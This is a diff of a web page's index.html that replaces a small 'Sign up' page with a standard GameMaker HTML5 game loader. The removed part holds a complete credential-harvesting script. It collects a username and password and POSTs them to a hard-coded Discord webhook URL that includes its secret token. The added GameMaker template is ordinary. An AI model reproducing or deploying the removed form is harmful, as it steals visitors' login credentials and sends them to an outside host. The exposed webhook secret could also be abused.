@@ -1,62 +1,119 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>Send Message to Discord</title>
-  </head>
-  <body style="background-color:#1c87c9;">
-<h2>Sign up</h2>
-<hr>
-    <form id="discord-form">
-      <label for="credentials">Username:</label><br>
-      <input type="text" id="credentials" name="credentials" required><br>
-      <label for="message">Password:</label><br>
-      <input type="password" id="message" name="message" maxlength="500" required><br>
-      
-      <input type="submit" value="Send">
-    </form>
+<html lang="en">
 
-    <script defer>
-      const form = document.getElementById("discord-form");
+    <!-- Custom PreHead code is injected here -->
+    
 
-      form.addEventListener("submit", function(event) {
-        event.preventDefault();
+    <head>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="apple-mobile-web-app-capable" content="yes" />
+        <meta name ="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+        <meta charset="utf-8"/>
 
-        const credentials = document.getElementById("credentials").value;
-        const [username, password] = credentials.split(":");
-        const message = document.getElementById("message").value;
+        <!-- Builtin injector for disabling cache -->
+        <meta http-equiv="pragma" content="no-cache"/>
 
-        if (message.trim() === "") {
-          alert("Cannot send an empty message");
-          return;
-        }
+        <!-- Set the title bar of the page -->
+        <title>Created with GameMaker</title>
 
-        const data = new FormData();
-        data.append("username", username);
-        data.append("password", password);
-        data.append("content", message);
+        <!-- Custom PreStyle code is injected here -->
+        
 
-        fetch("https://discord.com/api/webhooks/1232953686322446337/4LZGkLR_mbnCIjO8YVSL0V1mElDKkeamFYz4tw-NzqYtBkr06nmMifh9ZLI3sjf2nuJJ", {
-          method: "POST",
-          body: data
-        })
-        .then(response => {
-          if (!response.ok) {
-            throw new Error("Failed to send message to Discord");
-          }
-          return response.json();
-        })
-        .then(data => {
-          console.log("Message sent to Discord:", data);
-        })
-        .catch(error => {
-          console.error("Error sending message to Discord:", error);
-        });
-      });
-    </script>
-<hr>
-<p> Hello welcome to KubuKlassika site - Qormi71 </p>
-<hr>
-<h3>Users</h3>
-<p> - Qormi71 <br/> - anniikatang </p>
-  </body>
+        <!-- Set the background colour of the document -->
+        <style>
+            body {
+                background: #0;
+                color: #cccccc;
+                margin: 0px;
+                padding: 0px;
+                border: 0px;
+            }
+
+            canvas {
+                image-rendering: optimizeSpeed;
+                -webkit-interpolation-mode: nearest-neighbor;
+                -ms-touch-action: none;
+                touch-action: none;
+                margin: 0px;
+                padding: 0px;
+                border: 0px;
+            }
+            :-webkit-full-screen #canvas {
+                width: 100%;
+                height: 100%;
+            }
+            :-webkit-full-screen {
+                width: 100%;
+                height: 100%;
+            }
+            
+            /* Custom Runner Styles */
+            div.gm4html5_div_class {
+                margin: 0px;
+                padding: 0px;
+                border: 0px;
+            }
+            div.gm4html5_login {
+                padding: 20px;
+                position: absolute;
+                border: solid 2px #000000;
+                background-color: #404040;
+                color:#00ff00;
+                border-radius: 15px;
+                box-shadow: #101010 20px 20px 40px;
+            }
+            div.gm4html5_cancel_button {
+                float: right;
+            }
+            div.gm4html5_login_button {
+                float: left;
+            }
+            div.gm4html5_login_header {
+                text-align: center;
+            }
+            /* END - Custom Runner Styles */
+            
+        </style>
+
+        <!-- Custom PostStyle code is injected here -->
+        
+
+        <!-- Builtin injector for injecting flurry analytics code -->
+        
+    </head>
+
+    <!-- Custom PostHead code is injected here -->
+    
+
+    <!-- Custom PreBody code is injected here -->
+    
+
+    <body>
+        <div class="gm4html5_div_class" id="gm4html5_div_id">
+            
+            <!-- Builtin injector for splash screen -->
+            
+
+            <!-- Create the canvas element the game draws to -->
+            <canvas id="canvas" width="1366" height="768" >
+                <p>Your browser doesn't support HTML5 canvas.</p>
+            </canvas>
+        </div>
+
+        <!-- Run the game code -->
+        <script type="text/javascript" src="html5game/KubuAlpha.js?cachebust=1184431291"></script>
+
+        <!-- Builtin injector for injecting runner path -->
+        
+
+        <script>window.onload = GameMaker_Init;</script>
+
+        <!-- Builtin injector for injecting google analytics code -->
+        
+
+    </body>
+
+    <!-- Custom PostBody code is injected here -->
+    
 </html>
